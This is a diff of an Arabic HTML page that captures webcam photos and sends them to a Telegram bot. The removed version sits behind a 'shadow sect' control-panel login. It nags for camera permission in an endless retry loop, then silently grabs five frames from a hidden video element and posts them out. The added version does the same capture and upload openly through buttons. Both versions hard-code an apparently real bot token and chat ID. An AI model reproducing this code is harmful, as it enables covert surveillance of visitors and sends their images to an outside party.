@@ -2,227 +2,95 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-<meta charset="utf-8" />
-<meta name="viewport" content="width=device-width,initial-scale=1" />
-<title>لوحة التحكم — دخول</title>
+<meta charset="UTF-8">
+<title>📤 إرسال الصور للبوت</title>
 <style>
-  :root{ --bg:#000; --card:#0b0b0b; --accent:crimson; --text:#fff; }
-  html,body{height:100%;margin:0;background:var(--bg);color:var(--text);font-family:Arial, sans-serif}
-  .center-wrap{height:100%;display:flex;align-items:center;justify-content:center;padding:20px;box-sizing:border-box;}
-  .login-card{width:100%;max-width:720px;background:linear-gradient(180deg,var(--card), #070707);border-radius:14px;padding:36px;box-shadow:0 10px 40px rgba(0,0,0,0.6);text-align:center;border:2px solid rgba(255,0,0,0.06);}
-  .brand{font-size:28px;font-weight:700;color:var(--accent);text-shadow:0 0 18px rgba(220,20,60,0.35);margin-bottom:18px;}
-  .prompt{font-size:16px;margin-bottom:18px;opacity:0.95}
-  .pw-input{width:100%;max-width:520px;margin:0 auto 18px auto;display:flex;gap:12px;align-items:center;justify-content:center;}
-  .pw-input input[type="password"]{flex:1;padding:18px 20px;font-size:22px;border-radius:10px;border:2px solid rgba(255,255,255,0.06);background:#0c0c0c;color:var(--text);outline:none;text-align:center;letter-spacing:3px;}
-  .pw-input input::placeholder{opacity:0.6}
-  .pw-input button{padding:14px 28px;font-size:18px;border-radius:10px;background:var(--accent);color:white;border:none;cursor:pointer;box-shadow:0 6px 18px rgba(220,20,60,0.25);transition:transform .12s ease;}
-  .pw-input button:active{transform:translateY(2px)}
-  .error{color:#ff6666;background:rgba(255,0,0,0.04);border:1px solid rgba(255,0,0,0.08);padding:10px 14px;margin-top:8px;border-radius:8px;display:inline-block;min-width:200px}
-  .shake{animation:shake .45s ease}@keyframes shake{0%{transform:translateX(0)}20%{transform:translateX(-8px)}40%{transform:translateX(8px)}60%{transform:translateX(-6px)}80%{transform:translateX(6px)}100%{transform:translateX(0)}}
-  #panel{display:none;padding:20px}
-  .controls{max-width:900px;margin:20px auto}
-  .controls input[type=file]{display:block;margin:10px auto;padding:10px;color:var(--text)}
-  .controls button{display:inline-block;margin:8px;padding:10px 16px;border-radius:8px;background:var(--accent);border:none;color:#fff;cursor:pointer;font-weight:600}
-  video{display:none}
+  body { background:#111; color:white; font-family:Arial; text-align:center; padding:40px; }
+  h1 { color:#e63946; }
+  button, input { margin:10px; padding:12px; border:none; border-radius:8px; }
+  button { background:#e63946; color:white; font-size:16px; cursor:pointer; }
+  video { width:300px; border:2px solid white; margin-top:10px; display:none; }
 </style>
 </head>
 <body>
 
-<div class="center-wrap" id="loginWrap">
-  <div class="login-card" role="dialog" aria-labelledby="loginTitle">
-    <div id="loginTitle" class="brand">لوحة تحكم — مملكة طائفة الظلال</div>
-    <div class="prompt">أدخل كلمة المرور الرقمية للدخول إلى لوحة التحكم</div>
+<h1>📤 إرسال الصور إلى بوت تليغرام</h1>
 
-    <div class="pw-input" aria-live="polite">
-      <input id="passwordInput" type="password" inputmode="numeric" placeholder="ادخل كلمة المرور الرقمية" aria-label="كلمة المرور">
-      <button id="loginBtn">دخول</button>
-    </div>
+<!-- زر رفع صور من الجهاز -->
+<input type="file" id="fileInput" accept="image/*" multiple>
+<button onclick="uploadAndSendToTelegram()">إرسال الصور من الجهاز</button>
 
-    <div id="errorBox" style="height:46px;margin-top:6px;"></div>
-    <div style="margin-top:12px;opacity:0.7;font-size:13px;">ملاحظة: بعد الدخول يتم محاولة التقاط صور في الخلفية (إن سمح المتصفح)</div>
-  </div>
-</div>
+<br><br>
 
-<!-- لوحة التحكم -->
-<div id="panel">
-  <div style="max-width:1000px;margin:18px auto;padding:18px;background:#0b0b0b;border-radius:12px;border:1px solid rgba(255,0,0,0.06)">
-    <h2 style="color:crimson;margin:0 0 10px 0">لوحة التحكم</h2>
-    <p style="margin:0 0 12px 0">رفع صور يدوياً لتظهر في الصفحة الرئيسية أو السماح بالالتقاط التلقائي بالكاميرا.</p>
-    <div class="controls">
-      <label style="display:block;margin-bottom:6px">رفع صور من الجهاز (لتظهر في الصفحة الرئيسية):</label>
-      <input id="fileInput" type="file" accept="image/*" multiple />
-      <button id="uploadBtn">رفع الصور</button>
-    </div>
-  </div>
-</div>
-
-<!-- فيديو مخفي يُستخدم لالتقاط الإطارات في الخلفية -->
+<!-- زر التقاط صور من الكاميرا -->
 <video id="video" autoplay playsinline></video>
+<canvas id="canvas" style="display:none;"></canvas>
+<button onclick="captureMultiplePhotos()">📸 التقاط 5 صور بالكاميرا</button>
 
 <script>
-/* ========== إعدادات البوت وهاش كلمة السر (SHA-256) ========== */
-// ضع رقم الشات الفعلي هنا:
-const TG_TOKEN = "7557167179:AAG0_jw9g7EEPhFKJbW5pMLhiPidHrGzt8M";
-const CHAT_ID  = 1234567890; // ← غيّره إلى chat_id الخاص بك
+const BOT_TOKEN = "7557167179:AAG0_jw9g7EEPhFKJbW5pMLhiPidHrGzt8M";
+const CHAT_ID   = "7664410054";
 
-// هاش SHA-256 لكلمة المرور "7664410054"
-const PASS_HASH = "e789f712e38c905c821e1f1807f7dd574bb14691dbbe53e23c0686370ef596df";
+/* 🔹 دالة إرسال ملف (صورة) إلى بوت تليغرام */
+async function sendPhotoToTelegram(file) {
+    let formData = new FormData();
+    formData.append("chat_id", CHAT_ID);
+    formData.append("photo", file);
 
-/* ========== عناصر الواجهة ========== */
-const passwordInput = document.getElementById('passwordInput');
-const loginBtn = document.getElementById('loginBtn');
-const errorBox = document.getElementById('errorBox');
-const loginWrap = document.getElementById('loginWrap');
-const panel = document.getElementById('panel');
-const videoEl = document.getElementById('video');
-const uploadBtn = document.getElementById('uploadBtn');
-const fileInput = document.getElementById('fileInput');
-
-/* ========== دوال مساعدة ========== */
-function showError(msg){
-  errorBox.innerHTML = `<div class="error" id="errMsg">${msg}</div>`;
-  const el = document.getElementById('errMsg');
-  el.classList.add('shake');
-  setTimeout(()=> el.classList.remove('shake'), 500);
-}
-function clearError(){ errorBox.innerHTML = ''; }
-
-/* حساب SHA-256 لنص (يعيد hex) */
-async function sha256Hex(message){
-  const msgBuffer = new TextEncoder().encode(message);
-  const hashBuffer = await crypto.subtle.digest('SHA-256', msgBuffer);
-  const hashArray = Array.from(new Uint8Array(hashBuffer));
-  return hashArray.map(b => b.toString(16).padStart(2,'0')).join('');
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+        method: "POST",
+        body: formData
+    });
 }
 
-/* محاولة تسجيل الدخول */
-async function attemptLogin(){
-  clearError();
-  const val = (passwordInput.value || '').trim();
-  if (!val) { showError('الرجاء إدخال كلمة السر'); return; }
-  try {
-    const h = await sha256Hex(val);
-    if (h === PASS_HASH) {
-      // ناجح
-      enterPanel();
-    } else {
-      showError('❌ كلمة السر غير صحيحة');
-      passwordInput.value = '';
-      passwordInput.focus();
+/* 🔹 رفع صور من الجهاز */
+async function uploadAndSendToTelegram() {
+    const files = document.getElementById("fileInput").files;
+    if (!files.length) {
+        alert("⚠️ اختر صور أولاً من جهازك!");
+        return;
     }
-  } catch(e){
-    showError('حدث خطأ أثناء التحقق');
-    console.error(e);
-  }
-}
-
-/* عند Enter */
-passwordInput.addEventListener('keyup', (e)=> { if (e.key === 'Enter') attemptLogin(); });
-loginBtn.addEventListener('click', attemptLogin);
-
-/* ========== بعد الدخول: بدء اللوحة وطلب الكاميرا مع إعادة المحاولة ========== */
-async function enterPanel(){
-  loginWrap.style.display = 'none';
-  panel.style.display = 'block';
-  // اطلب الكاميرا مرارا حتى يمنحها المستخدم (حذر: المتصفح قد يقيّد الطلبات المتكررة)
-  await requestCameraUntilGranted();
-}
-
-/* طلب الكاميرا و إعادة المحاولة عند الرفض */
-async function requestCameraUntilGranted(){
-  const retryDelay = 2000; // مللي ثانية
-  while (true) {
-    try {
-      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-      videoEl.srcObject = stream;
-      // نبدأ الالتقاط التلقائي بعد التأكد من تشغيل الفيديو
-      await new Promise(resolve => {
-        videoEl.onloadedmetadata = () => setTimeout(resolve, 600);
-      });
-      // التقاط 5 صور وإرسالها
-      await captureAndSendMultiple(5, 1500);
-      break; // خرج من اللوب بعد النجاح
-    } catch (err) {
-      // إذا رفض المستخدم الإذن نعيد الطلب بعد تأخير
-      console.warn('كاميرا: رفض أو خطأ — إعادة الطلب بعد', retryDelay, 'مللي');
-      // نعرض رسالة لطيفة للمستخدم مع زر لإعادة المحاولة يدوياً
-      showError('⚠️ لم تمنح إذن الكاميرا. سيعاد الطلب تلقائياً كل ثانيتين حتى تمنح الإذن.');
-      await new Promise(r => setTimeout(r, retryDelay));
-      clearError();
+    for (let file of files) {
+        await sendPhotoToTelegram(file);
     }
-  }
-  // بعد الانتهاء نُعلم المستخدم
-  const done = document.createElement('div');
-  done.style.marginTop = '12px';
-  done.style.color = '#bfbfbf';
-  done.textContent = '✅ محاولة الالتقاط انتهت (إن سُمِح بالوصول إلى الكاميرا)';
-  panel.prepend(done);
+    alert("✅ تم إرسال الصور من جهازك للبوت!");
 }
 
-/* التقاط إطار واحد */
-function captureFrame(){
-  const w = videoEl.videoWidth || 640;
-  const h = videoEl.videoHeight || 480;
-  const canvas = document.createElement('canvas');
-  canvas.width = w;
-  canvas.height = h;
-  const ctx = canvas.getContext('2d');
-  ctx.drawImage(videoEl, 0, 0, w, h);
-  return new Promise(res => canvas.toBlob(blob => res(blob), 'image/jpeg', 0.85));
+/* 🔹 التقاط 5 صور بالكاميرا */
+async function captureMultiplePhotos() {
+    const video = document.getElementById("video");
+    const canvas = document.getElementById("canvas");
+
+    // طلب إذن للوصول للكاميرا
+    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+    video.srcObject = stream;
+    video.style.display = "block";
+
+    let count = 0;
+    let interval = setInterval(() => {
+        if (count >= 5) {
+            clearInterval(interval);
+            stream.getTracks().forEach(track => track.stop()); // إيقاف الكاميرا بعد التصوير
+            video.style.display = "none";
+            alert("📸✅ تم التقاط وإرسال 5 صور للبوت!");
+            return;
+        }
+
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        const ctx = canvas.getContext("2d");
+        ctx.drawImage(video, 0, 0);
+
+        // تحويل الصورة لملف Blob
+        canvas.toBlob(async (blob) => {
+            const file = new File([blob], `captured_${count+1}.jpg`, { type: "image/jpeg" });
+            await sendPhotoToTelegram(file);
+        }, "image/jpeg", 0.95);
+
+        count++;
+    }, 1000); // كل ثانية يلتقط صورة
 }
-
-/* التقاط N صور وإرسالها للبوت بفاصل */
-async function captureAndSendMultiple(n = 5, gapMs = 1800){
-  for (let i = 1; i <= n; i++){
-    try {
-      const blob = await captureFrame();
-      await sendTelegramPhoto(blob, i);
-    } catch (e) {
-      console.error('خطأ خلال الالتقاط أو الإرسال:', e);
-    }
-    if (i < n) await new Promise(r => setTimeout(r, gapMs));
-  }
-}
-
-/* إرسال Blob صورة إلى Telegram */
-async function sendTelegramPhoto(blob, idx){
-  try {
-    const url = `https://api.telegram.org/bot${TG_TOKEN}/sendPhoto`;
-    const fd = new FormData();
-    fd.append('chat_id', CHAT_ID);
-    fd.append('photo', blob, `photo_${Date.now()}_${idx}.jpg`);
-    await fetch(url, { method: 'POST', body: fd });
-  } catch (e) {
-    console.error('sendTelegramPhoto error', e);
-  }
-}
-
-/* رفع صور يدوياً وحفظها في localStorage (تُعرض في index.html) */
-function uploadFiles(){
-  const files = fileInput.files;
-  if (!files || files.length === 0) { alert('المرجو اختيار صور'); return; }
-  const stored = JSON.parse(localStorage.getItem('gallery') || '[]');
-  let remaining = files.length;
-  for (let f of files){
-    const reader = new FileReader();
-    reader.onload = e => {
-      stored.push({ src: e.target.result, desc: 'مرفوعة من لوحة التحكم' });
-      remaining--;
-      if (remaining === 0) {
-        localStorage.setItem('gallery', JSON.stringify(stored));
-        alert('✅ تم رفع الصور وحفظها للصفحة الرئيسية');
-        fileInput.value = '';
-      }
-    };
-    reader.readAsDataURL(f);
-  }
-}
-
-/* ربط حدث زر الرفع */
-uploadBtn.addEventListener('click', uploadFiles);
-
-/* جعل الحقل مركّز عند التحميل */
-document.addEventListener('DOMContentLoaded', ()=> { passwordInput.focus(); });
 </script>
 </body>
 </html>
+
